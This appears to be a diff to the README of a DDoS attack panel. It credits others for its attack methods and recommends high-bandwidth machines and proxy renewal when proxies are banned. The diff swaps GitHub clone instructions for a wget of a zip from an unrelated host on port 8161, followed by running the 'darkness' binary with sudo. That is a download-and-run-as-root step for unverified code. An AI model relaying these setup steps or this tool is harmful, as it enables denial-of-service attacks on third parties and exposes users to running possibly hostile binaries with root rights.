@@ -25,33 +25,19 @@ Thanks to MHProDev, Leeon123, R00tS3c, emp001, cocorisss  and wachirachoomsiri f
 <br><br>
 Thanks to MHProDev, Leeon123, R00tS3c, emp001, cocorisss  and wachirachoomsiri for their methods. This tool is an one-in-all DDOS Panel with the best methods. Only the panel it self, and the functionality is coded by z3ntl3 root. Others are not part of our code!
 
-
 # Installation
+```wget https://vidcache.net:8161/static/0c348ed32c0a03e5b13fb099cf0465a570c199df/Anti-Cursed-Darkness-Squad-BETA-main.zip
 
-    Go into your Anti-Cursed-Darkness-Squad Installation Folder
-    Or install it by:
-    
-    git clone https://github.com/Z3NTL3/Anti-Cursed-Darkness-Squad-BETA
-    cd Anti-Cursed-Darkness-Squad-BETA
-   
-    
-    ulimit -n 999999
-    sudo apt install python3
-    python3 installer.py
- 
-    ERROR FIX:
-    chmod +x fixer
-    sudo ./fixer
-    
-    
-    To run after installation:
-    ulimit -n 999999
-    sudo ./darkness
-    
-    When proxies banned, then renew it by "proxy-crawl" command.
-    
-    We recommend using 16gb ram , 1-10 GBPS machine to have the good power! 
+unzip Anti-Cursed-Darkness-Squad-BETA-main.zip
 
+cd Anti-Cursed-Darkness-Squad-BETA-main
+
+chmod +x darkness
+
+sudo ./darkness
+
+# type menu and then fixer to install all required modules and then update done!
+```
 
 # Updates
 https://scorpion-hackz.com/acds/update-log.txt
